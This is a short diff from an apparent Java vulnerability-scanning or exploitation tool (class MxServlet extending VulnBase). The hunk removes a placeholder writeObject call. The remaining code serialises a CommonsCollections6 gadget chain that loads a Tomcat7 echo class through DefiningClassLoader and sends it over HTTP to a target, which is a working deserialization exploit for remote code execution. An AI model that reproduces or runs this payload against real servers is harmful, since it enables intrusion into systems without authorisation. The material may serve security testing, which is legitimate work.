@@ -104,7 +104,6 @@ public class MxServlet extends VulnBase {
             // 发送请求
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos);
-            oos.writeObject("yyds");
             oos.writeObject(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.Tomcat7Echo, ClassCode.Tomcat7Echo_testzxcv4}));
             HttpURLConnection exec_conn = (HttpURLConnection) apiUrl.openConnection();
 
